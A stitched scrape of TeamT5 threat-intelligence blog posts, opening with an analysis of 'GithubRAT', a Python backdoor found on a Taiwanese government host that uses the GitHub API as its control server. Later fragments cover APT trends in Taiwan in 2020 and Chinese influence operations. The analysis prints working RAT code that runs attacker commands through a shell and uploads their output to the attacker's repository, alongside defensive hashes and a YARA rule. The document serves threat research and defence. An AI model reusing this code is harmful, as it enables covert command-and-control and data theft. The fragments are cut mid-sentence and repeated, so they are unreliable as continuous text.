前言\nTeamT5 近期於台灣某政府機關發現駭客入侵事件，駭客於受害端點上植入遠端控制程式（Remote Access Tool, RAT）。特別之處在於，駭客透過 GitHub 雲端服務做為中繼站，藉此規避網路閘道端資安設備的偵測與攔阻。下圖為該受害主機向中繼站報到時，所回傳的端點資訊，可清楚看出該端點的域名為台灣政府機關。\n\n![202008-1](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022323/202008-1_2e7fc527df.png)\n_圖一、台灣某政府單位受駭_\n\n## 技術分析\nTeamT5 分析此 GithubRAT 後門程式，發現原為 Python Script，透過 PyInstaller 封裝為 Windows 執行檔。\n\nGithubRAT 執行後，會透過 api.github.com 連線至駭客的 Github 專案（Repository），並將駭客下達指令的結果回傳至 Github 專案上，其檔名為 Base64 編碼後的受害電腦名稱，網路封包如下圖所示。\n\n![202008-2](https://res.cloudinary.com/dvgomg5gh/image/upload/v1597022324/202008-2_6b4b387c8f.png)\n_圖二、GithubRAT 使用 api.github.com 作為惡意中繼站_\n\n\u003cbr\u003e\n\nTeamT5 分析 GithubRAT 惡意程式運作原理，將其執行步驟拆解如下：\n\n 1. 連線至駭客的 Github 專案，如下所示。\n \n    ```\n    def __init__(self):\n        self.back_git_heart = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART, self.back_sid)\n        self.back_git_cmd = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD, self.back_sid)\n        self.back_git_answer = 'https://api.github.com/repos/{}/{}/contents/{}/{}/{}'.format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER, self.back_sid)\n        self.back_git_token = 'https://api.github.com/repos/{}/{}/contents/{}/{}'.format(B_USER, B_PROJECT, B_PATH, 'token')\n     ```\n \n 2. 將電腦名稱透過 Base64 編碼並註冊回傳至 Github 專案中。\n 3. 從 Github 專案下載駭客的控制指令。\n 4. 利用命令提示字元 cmd.exe 執行駭客指令，如下所示。\n\n     ```\n    def back_cmd(self, command):\n        _t_data = 'timeout'\n        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)\n        _t = 10\n        while _t \u003e 0:\n            time.sleep(1)\n            if p.poll() == 0:\n                _t_data = p.stdout.read() + p.stderr.read()\n                break\n            _t = _t - 1\n        return _t_data\n    ```\n \n 5. 將指令執行之結果回傳至 Github 專案中，如下所示。\n\n ```\n def _put_git_answer(self, data):\n    _result_status = False\n    _status, _sha = self._get_git_hash(self.back_git_answer)\n    d = {'message': 'my commit message',\n       'content': base64.b64encode(data),\n       'sha': _sha\n       }\n    headers = {'Authorization': 'token ' + B_TOKEN,'user-agent': B_USER_AGENT}\n    try:\n        r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)\n        if not _status and r.status_code == 201:\n            _result_status = True\n        if _sha and r.status_code == 200:\n            _result_status = True\n    except Exception as e:\n        pass\n    return _result_status\n ```\n \n 6. 不斷重複步驟 3 至步驟 5。\n\n\u003cbr\u003e\n\n另外，我們也發現駭客放置許多惡意程式於該 Github 專案中，其中包含密碼竊取（Password Dump）、漏洞利用（Exploit）及後門（Backdoor）等惡意程式，其詳細清單如下表所示。\n\n|Hash|說明|\n|---|---|\n|a5f12ee032af8e8dd5a373f611f64726|Backdoor Loader|\n|944465a0edd09d8eb569630a68ee111c|Cobalt Strike

的存取都會是許可的狀態，這也變成駭客反過來利用的機制。駭客利用大眾對於雲端服務的需求，轉而透過該雲端服務作為中繼站，遠端控制受害電腦。同時，該 GithubRAT 係透過 PyInstaller 進行封裝，駭客使用其他封裝工具即可快速改變檔案雜湊值，因此 TeamT5 建議可透過網路連線紀錄來威脅狩獵（Threat Hunting），找尋環境內是否有密集且定期的 api.github.com 連線紀錄，藉此找出環境中異常的網路存取連線。\n\n最後，若單位遭遇進階持續性威脅（Advanced Persistent Threat, APT）時，建議可使用 TeamT5 的 ThreatSonar 惡意威脅鑑識分析平臺，可有效偵測此類進階攻擊手法，並快速完成事件關聯與回應。TeamT5 建議可將下方威脅指標（Indicator of Compromise, IOC）匯入各式資安設備中，強化威脅偵測與識別。\n\n* 表一中所有的惡意程式雜湊值\n* Yara Rule\n\n```\nrule RAT_Github\n{\n    meta:\n        description= \"detecting GithubRAT memory\"\n        author = \"TeamT5\"\n        date =

White Paper III: China’s Social Manipulation outside the Great Firewall","context":"In the final part of our Information Operation White Paper, we will demonstrate China's Information Operations (InfoOps) targeting the global audience. The first part of the report displays a brief overview of its overt operations which are carried out by state media, embassies, and diplomats. Then we look into the covert operations, which can be observed in pro-China fan pages, content farms, and spam botnet. Last but not least, we provide the case study of \"Operation Juiker\" on Taiwan's largest forum PTT, which suggests the possibility of the APT (Advanced Persistent Threat) actors entering the threat landscape.\n\n#### Key Takeaways\n\n1. China has escalated the level of overt InfoOps via state-media and diplomats.\n\u003cbr\u003e\n\u003cbr\u003e\nChinese state media, diplomats, and embassies are the main actors of Chinese overt InfoOps. They shoulder the task to polish the image of the regime and propagate the narrative of the Chinese Communist Party (CCP). It is noteworthy that their official accounts have obtained an unexpected number of followers in recent years. For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook. Their main audience, apart from the Chinese citizens, are overseas Chinese diaspora, which many of them have rights to vote in countries such as the U.S., Canada, and Australia, thus having the ability to influence a country's politics.\n\u003cbr\u003e\n\u003cbr\u003e\n2. Covert InfoOps remain active on Western social media platforms.\n\u003cbr\u003e\n\u003cbr\u003e\n2020 is a year which has set many records. This year, the takedowns of covert Chinese social media accounts by Facebook, Twitter, and Google are more frequent than ever. However, even with such efforts, we observed that there are new covert actors emerging across the platforms, while the banned actors keep coming back to the scene by registering new domains and new accounts. We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest. We also detected numerous networks of pro-China political accounts that demonstrated strong signs of automated behavior.\n\u003cbr\u003e\n \u003cbr\u003e\n3. APT actors might have entered the InfoOps threat landscape.\n\u003cbr\u003e\n\u003cbr\u003e\nThe situation is become more alarming as we discovered that the Advanced Persistent Threat (APT) actors might have entered the InfoOps threat landscape. APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤

是個輕量化的後門控制程式，支援最基本的檔案上傳/下載、指令執行及程序操作等功能。通常被駭客用於成功入侵後的第二階段控制（2nd-stage RAT）之用。先前所掌握的 MovieRAT 後門為 Windows 惡意程式，會透過 HTTP 通訊協定與中繼站連線，所使用的 Cookie 具有特定格式。\n\n根據 TeamT5 的情資，將 MovieRAT 定位到駭客組織 Lazarus 身上。Lazarus 為北韓的駭客族群，擁有多起攻擊金融產業的紀錄，尤其特別針對 SWIFT 跨國轉帳交易系統和 ATM 自動櫃員機系統進行攻擊。推測為了替北韓政權籌措資金，好發展武器與實驗，故多選擇金融產業和具有關鍵技術的私人企業進行攻擊。過往的攻擊行動中，會在惡意程式內參雜俄文，企圖混淆分析人員。近期則是開始大量入侵攻擊虛擬貨幣交易所，如 Bithumb、Youbit 及 Yapizon

年被公認為充滿混亂與災禍的一年。各式各樣的大事件諸如新冠肺炎、中亞東歐台海等地的地緣政治衝突、英國脫歐、美國總統大選都將世界各地的人們帶向跟過去截然不同的生活。TeamT5 在過去一年中持續幫助受到國家力量支持的針對性攻擊行動（或稱 APT 攻擊）所受害的單位。同時間 TeamT5 的威脅情資團隊也主動追蹤 APT 攻擊者的各類行蹤。跟真實世界相比較，網路世界的混亂情況並不亞於我們於現實世界所見，同時網路世界的衝突有很大一部份是真實世界的映射或延伸。本篇文章將探討 TeamT5 在 2020 年所觀察到的台灣威脅態勢。\n\n在本篇文章中，我們首先會為您介紹我們在 2020 年所觀察到的重大趨勢，包含了：\n\n- APT 攻擊的演進，網路間諜不再是唯一的攻擊手段\n- 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n- 由新冠肺炎所引發的網路攻擊\n\n接著我們會針對所觀察到的攻擊行動進行分析，試圖以產業別以及攻擊族群視角來進行網路威脅情資的剖析。文章的最後則是我們對如何應對網路攻擊不斷變化的建議作為總結。\n\n\u003cbr\u003e\n\n### 網路間諜不再是唯一的攻擊手段\n\n2020 年所公開的網路攻擊中，影響最深遠的當數中國 APT 攻擊者於五月時針對多個能源產業公司所進行的勒索軟體攻擊 [1]。TeamT5 研究顯示，這是一個來自中國惡名昭彰的 APT 攻擊族群，規畫已久的攻擊行動。這個行動究竟是攻擊者單純以獲取金錢為目的所發起的勒索行動，抑或是以勒索軟體為掩護的政治嚇阻行動（時值 520 台灣總統上任前），背後的答案依舊成謎。無論如何，本次的攻擊行為已為中國對台 APT 攻擊行動劃下新的里程碑：中國 APT 已針對台灣進行二十年以上的攻擊，但行動範圍都維持在竊取機密為目的而進行的網路間諜行動，這次攻擊意味著攻擊者將開始採用更多元的戰術來對台灣進行網路打擊行動。\n\n另一個發生在 PTT BBS 論壇上的攻擊行動可以佐證我們的臆測：在 2020 年七月，TeamT5 追蹤了一連串的 BBS 爆料貼文，試圖詆毀台灣政府與軍方的形象，攻擊者使用了多個境外跳板 IP 位址來試圖隱藏他們的來源，然而 TeamT5 的情資資料庫顯示，其中一個來源 IP 曾被某個鎖定台灣已久的 APT 攻擊族群所使用；無獨有偶，我們也獲得某訊息來源指出，該 APT 族群正是隱身在此次行動背後的攻擊者。我們相信這兩個事件正是一個警訊，告訴我們中國 APT 族群正在嘗試各種過去沒使用過的手法來做更多樣性的攻擊行動。\n\n\u003cbr\u003e\n\n### 供應鏈攻擊成為 2020 年 APT 攻擊的主要攻擊方式之一\n\nTeamT5 曾在過去示警過供應鏈攻擊手法的危險性 [2]，研究顯示它在 2020 年已經成為 APT 攻擊的一種主要入侵手法之一：2020 年十二月被揭露的 SolarWinds/SUNBURST 攻擊行動無疑是當前最成功的案例之一，受害目標包含了許多美國高層政府部門，全球前五百大公司，甚至數個資安廠商本身也在本次攻擊中被攻擊者攻陷，它的手法精細而行動縝密，以致於目前仍無法掌握整個攻擊全貌。在台灣，TeamT5 也觀察到至少三波的攻擊行動使用了類似的手法：攻擊者先針對服務供應商進行滲透，再進一步利用供應商的產品或服務當跳板來直接進入終端用戶，包含政府部門或其他各產業的公司。前兩波的攻擊行動已於八月間被法務部調查局所公開揭露 [3]，而第三波攻擊行動仍在調查中。我們目前已觀察到數十家甚至上百的台灣公私單位被這些行動所成功滲透，而且至少有三個來自中國的 APT 族群參與其中。\n\n\u003cbr\u003e\n\n### 由新冠肺炎所引發的網路攻擊\n\n第三個攻擊趨勢則為新冠肺炎所趨使的網路攻擊行動。隨著新冠肺炎疫情爆發數週內，TeamT5 就觀察到有國家支持的網路攻擊者開始疫情相關的情報蒐集；隨著時序進入下半年，攻擊者的目標開始轉向疫苗發展資訊的蒐集，可以看出網路攻擊行動隨著現實世界改變的趨勢。在台灣，TeamT5 也分析了數個以新冠疫情為主題所進行的攻擊行動，甚至有數波針對醫療相關部門的針對性攻擊行動。我們相信只要疫情尚未消散的一天，相關的攻擊行動就會持續進行。\n\nTeamT5 威脅情資團隊在 2020 年分析了近百個來自中國的 APT 攻擊。統計結果顯示，政府和軍方部門仍為最大的攻擊目標，相對應的攻擊事件超過了總數的四分之一，幾乎每個在台灣地區有活動的 APT 族群都會嘗試攻擊相關部門，主要的原因在於 APT 的主要目標是獲取國家相關的機密情資。值得注意的是，針對資訊產業的攻擊在 2020 年躍升為第二大，顯示 APT 攻擊對資訊公司的高度興趣，主要的原因應與前述的供應鏈攻擊趨勢有關：這些資訊產業公司往往同時服務許多客戶並橫跨不同部門產業，攻陷這些資訊公司提供攻擊者一個絕佳的跳板來進一步滲透終端客戶。\n\n能源產業是 2020 年被針對的第三大產業，TeamT5 觀察到至少有五個族群針對能源產業鏈中的多個部門進行滲透，我們認為這是一個徵兆，顯示敵人試圖控制台灣關鍵基礎設施的野心，因為這些部門在戰爭時期將會成為優先被癱瘓的目標。教育和智庫單位長久以來也名列 APT 攻擊目標排行榜中，相對應的攻擊數量在 2020 年位居第四名，主要的原因在於這些單位中的研究人員往往參與了政府的研究計畫或是政策制定。半導體產業是我們觀察到第五大被針對的目標，由於中國官方將半導體明定為十三五和十四五計畫中重點扶植的產業，這些攻擊應為有計劃性的網路間諜活動，目的在於竊取台灣相關的智慧財權或產業機密。醫療和運輸產業也是兩個在 2020 年被中國 APT 重點性針對的目標產業，如同前述，我們相信新冠肺炎可能是一個趨使攻擊者針對醫療產業的主要因素；交通相關產業部份，TeamT5 觀察到一個值得注意的現象：有一個我們稱為 GouShe（亦稱為 TroppicTropper、Keyboy）的 APT 族群特別針對台灣的交通運輸相關部門進行滲透，2020 年間的相關攻擊事件有七成以上均來自該族群。\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 年 APT 攻擊目標產業分佈_\n\n\u003cbr\u003e\n\nTeamT5 於 2020 年間共追蹤了至少九個 APT 族群的攻擊行動，當中有八個是來自中國。HUAPI（亦稱為 BlackTech、PLEAD）是所有族群中最具野心的一群，他們的攻擊行動佔了我們所觀察到總數近三成，而且攻擊目標幾乎涵蓋了上述的所有產業。我們在前面所提到的台灣供應鏈攻擊行動他們也都有參與。APT27（亦稱 EmissaryPanda、IronTiger、LuckyMouse、BronzeUnion）、GouShe 和 AMOEBA（亦稱 APT41、Barium、Winnti）也是在 2020 年攻擊台灣的數個主要攻擊來源族群：據 TeamT5 研究，APT27 主要攻擊政府、醫療和金融相關單位和產業。GouShe 近一、兩年的攻擊行動，展現了針對交通運輸部門和產業的高度興趣，同時我們也在能源和政府單位觀察到他們的蹤跡，TeamT5 針對此族群追蹤了近十年，研究結果顯示該族群可能接受所屬單位指令來監控台灣的關鍵基礎設施，並可能在關鍵時刻針對這些單位進行控制和接管。\n\nAMOEBA 在過去一年間主要攻擊目標包含了能源、半導體產業，教育智庫單位和資訊產業，從攻擊目標推斷，他們的主要目的偏向於智財和產業機密竊取，但我們不排除攻擊者會嘗試利用攻擊獲取成果進行二次利用，如同他們在五月間所進行的勒索攻擊行動一樣。SLIME1、SLIME9、SLIME13 是 TeamT5 對三個中國 APT 攻擊行動的暫時行動代稱，我們在近幾年都有持續觀察到他們的行動。Polaris（亦稱 MustangPanda）則是一個針對幾乎中國鄰近國家的 APT 族群，我們在三、四月間發現有多個來自他們的釣魚信件針對台灣政府和研究單位進行攻擊，我們推測他們試圖蒐集新冠肺炎相關疫情資訊。最後，我們在台灣也有發現一個由北韓 APT 族群 Lazarus 所使用的 Linux 後門工具，但沒有進一步資訊可以確認受害者身份資訊，雖然台灣在政治上並非北韓 APT 的主要攻擊目標，但由於 Lazarus 族群被公認肩負為北韓政府籌措財源的責任，舉例來說，2017 年發生在台灣銀行的 SWIFT 系統攻擊事件就是由 Lazarus 所為，此樣本也許是一個顯示 Lazarus 仍持續在台灣地區有活動跡象的警訊。\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_2020 年間攻擊台灣的 APT 族群_\n\n\u003cbr\u003e\n\n### 結語\n\nTeamT5 相信認識敵人是有效對抗針對性攻擊的第一步，而本文章主要針對 2020 年間所觀察到的 APT 網路攻擊態勢，提供一個概觀說明。TeamT5 威脅情資研究顯示 APT 攻擊手法持續進化，真正高端複雜的行動已經不可能由單一個資安產品做有效的防護。TeamT5 [ThreatVision](https://teamt5.org/tw/products/threatvision/)

Li**\n\n2020 was considered to be a year of chaos and disaster. Big events such as the outbreak of COVID-19, geopolitical conflicts escalations in several areas, Brexit, and the U.S. president election, all influenced people around the world. In 2020, TeamT5 continued helping numerous security breaches caused by state sponsored targeted instruction attacks (APT) . In the meantime, TeamT5 intelligence Team proactively tracked APT actors’ new activities. Compared with real world, the cyber world was also full of turmoil in 2020 and many of them are reflections or extensions to events in real world. In this article, we will discuss our observation of APT trends in Taiwan in 2020.\n\nIn this article, we will first walk you through some remarkable trends, including:\n\n- Evolution of APT tactic\n- Supply Chain attack became a primary method in APT attacks\n- COVID-19 driven cyber attacks\n\nWe will try to dissect the attacks happened in Taiwan in industrial view and adversarial view, which is a common method in threat intelligence analysis. Last part will be our conclusion and suggestions to respond with APT attacks.\n\n\u003cbr\u003e\n\n### Evolution of APT tactic\n\nIn 2020, the most notable APT event in public would be the ransom-attack that strike several energy related companies in May [1]. TeamT5 research shows it to be a well-organized campaign from a notorious Chinese adversary group. Whether financial gain or political deterrence is the real motivation behind the ransom-attack remains a mystery. However, it has marked a milestone of China’s cyber-attacks against Taiwan: Chinese APT have aimed Taiwan for more than 20 years but only limited in cyber espionage operations in the past but the threat actors are now exercising new tactics to evade us.\n\nAnother cyber-attack supporting our hypothesis occurred on PTT, the most popular BBS platform in Taiwan. TeamT5 tracked a series of posts related to some scandals, with attempts to uglify Taiwanese governments or military, on PTT in July 2020. The actors abused hopping servers from various countries to hide their footprints. However, TeamT5 intelligence database shows that one of the source IP address was also used by a Chinese APT that has targeted Taiwan for more than ten years. Besides, another private source also verified the same APT group to be the culprit behind the attack.  We consider both events to be indicators of China’s expansion on offensive cyber operations, which we have not observed in the past.\n\n\u003cbr\u003e\n\n### Supply Chain attack becoming a primary method in APT attacks\n\nSupply chain attack has become a major intrusion method for threat actors in 2020 and TeamT5 had warned such tactic in advance [2]. SolarWinds breach was undoubtedly the most successful story among them. Many high-profile US government agencies, Fortune 500 companies and even cybersecurity vendors were affected. It is so sophisticated that the scope is still uncertain yet. In Taiwan, we also observed at least three waves of similar attacks that infiltrated service providers and further leveraged their products or services to infect more victims. The first two had been published by the Ministry of Justice Bureau (MJIB) of Taiwan in August [3]. The third was still under investigation and the impact could be even bigger. We have seen a significant numbers of government agencies or private corporates in Taiwan being compromised. TeamT5 research shows that at least 3 distinct China nexus group were involved in these operations.\n\n\u003cbr\u003e\n\n### COVID-19 driven cyber attacks\n\nAnother interesting phenomenon would be COVID-19 related cyber-attacks. Soon after the outbreak of COVID-19 pandemic, we observed state sponsored actors collecting intelligence for the pandemic. In the second half of 2020, threat actors shifted their focus to chasing COVID-19 vaccine information with the advance of COVID-19 vaccine development. In Taiwan, TeamT5 also intercepted several spear phishing emails using COVID-19 as lure theme or even more campaigns related to healthcare related entities. We believe the trend will continue as long as the COVID-19 pandemic still exists.\n\nTeamT5 Intelligence Team had analyzed around one hundred APT attacks from China in 2020. Our statistic shows government and military agencies are still the biggest target and attacks against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n\u003cbr\u003e\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n\u003cbr\u003e\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense.

For instance, four Chinese state media are included in the top 20 most-followed pages on Facebook.

We spotted that there is a huge number of Facebook pages with admins located in China dedicated to disseminating Chinese propaganda content originated from Chinese social media platform, Weibo. Besides, there are sophisticated actors that create websites and subtle content to help the Chinese government shaping the narrative for the Hong Kong protest.

APT actors, typically a state-sponsored group, usually conduct prolonged and targeted cyberattacks to mine highly sensitive data. However, in mid-2020, we identified an InfoOp that can be linked to a notorious Chinese APT group which TeamT5 intelligence team has tracked for years. We discovered that the threat actors had disseminated disinformation about \"Juiker,\" a messaging app developed by Taiwan's research institute and widely used by government units, on Taiwan's largest forum PTT. The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.

Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks.

APT 攻擊者很可能參與了社群媒體上的資訊戰\n\u003cbr\u003e\n\u003cbr\u003e\n我們擔心 APT 攻擊者很可能參與了社群媒體上的資訊戰。APT 通常是由一個國家所支持的駭客團體，以竊取機敏資料為主，APT 的攻擊者往往具備了強悍的網路攻擊手法與資源。然而，我們今年偵察到了一個可能是由 APT 攻擊者發動的假新聞攻擊。該事件發生在 2020 年七月，PTT 論壇八卦版上，開始有許多被盜用的帳號以假新聞攻擊台灣重要軍事單位，造謠台灣公務機關使用的 Juiker 通訊軟體遭駭，以及台灣重要軍事機關遭駭。我們透過搜索比對貼文與發文 IP，發現其中一個 IP 位址，符合某個中國 APT 曾經使用過的中繼站。\n\u003cbr\u003e\n\u003cbr\u003e\n4. 威脅情資作為對抗資訊戰的重要環節\n\u003cbr\u003e\n\u003cbr\u003e\n如同前述的分析脈絡，APT 與社群操弄的結合會讓防守方更加棘手。在棘手的防守環境中，唯有威脅情資（threat intelligence）可以提供即時的分析，評估攻擊者的攻擊手法、可疑的指標、以及造成的風險。而在快速更迭的社群媒體環境中，平台方與事實查核團體非常難找到證據，歸因大量散播的假新聞。我們認為唯有導入威脅情資，才能有效幫助政府單位、重要關鍵基礎設施與企業，對抗資訊戰。\n\u003cbr\u003e\n\u003cbr\u003e\n\n若您對我們的白皮書有興趣，請填寫以下表單，取得完整的研究報告。\n\u003cbr\u003e\n\u003cbr\u003e\n追蹤 TeamT5 [Twitter](https://twitter.com/TeamT5_Official)，資安動態不漏接！\n\u003cbr\u003e","createdAt":"2020-10-14T07:24:40.028Z","updatedAt":"2020-12-04T03:23:18.109Z","__v":0,"id":"5f86a7b8da3440005757a941"}],"createdAt":"2020-10-14T03:15:06.772Z","updatedAt":"2021-06-02T05:41:47.633Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa02ba792d70040a0d8b3","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1602486856/2020%E7%99%BD%E7%9A%AE%E6%9B%B8V3%E5%AE%A3%E5%82%B3%E5%9C%96_blog_1920x1280_26f322ea32.jpg","attachment_id":"1IiFL4iEBKoOwQkSbmwVsQMXWOLV4r9pN","id":"5f866d3ada3440005757a928"}],"id":"5f867386da3440005757a940"},{"_id":"5eec1435163518003f86d92e","name":"cyber threat intelligence","createdAt":"2020-06-19T01:26:13.025Z","updatedAt":"2020-10-14T03:42:12.270Z","__v":0,"posts":[{"publish":true,"enable_form":false,"tags":["5eec17a6163518003f86d930","5eec141e163518003f86d92d","5eec1435163518003f86d92e"],"relative_posts":["5f61cd8e6f62730051a42a57"],"_id":"5ecab609602fc9004047605b","post_url":"teamt5-s-threatvision-cyber-threat-intelligence-platform-joins-polyswarm-malware-analysis-marketplace","post_name":"TeamT5's ThreatVision Cyber Threat Intelligence Platform Joins PolySwarm Malware Analysis Marketplace","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/v1590343158/20200507_news_696668f762.jpg","contents":[{"locale":"en","_id":"5ecab609602fc9004047605c","title":"TeamT5's ThreatVision Cyber Threat Intelligence Platform Joins PolySwarm Malware Analysis Marketplace","context":"TeamT5's ThreatVision APT identification engine is now integrating with PolySwarm malware analysis platform to help power the growing crowdsourced malware analysis marketplace.\n\nPolySwarm is a crowdsourced malware analysis platform specialized in new and emergent threats.

The operation, which we dub as \"Operation Juiker,\" aimed to discredit Taiwan's intelligence agency and government-backed research institute by spreading disinformation of the messaging app being hacked.\n\u003cbr\u003e\n\u003cbr\u003e\n4.  It is more crucial than ever to adopt threat intelligence solutions to combat the issue.\n\u003cbr\u003e\n\u003cbr\u003e\nThe abovementioned Operation Juiker has well demonstrated the possibility of \"APT + InfoOp\" attack model, which involves targeted social media campaigns disseminating disinformation based on highly confidential data. Such situation is super tricky, and it could pose a great threat to democratic countries. In this case, threat intelligence can help provide instant analysis of actor methodologies, suspicious indicators, and potential risks. We suggest that it is crucial for government units, critical infrastructure operators, and major business vendors to apply threat intelligence to combat this issue.\n\u003cbr\u003e\n\u003cbr\u003e\n\nIf you are interested in this white paper, please fill out the form below and get the full-text PDF.\n\u003cbr\u003e\n\u003cbr\u003e\nAnd don't miss our blog updates!

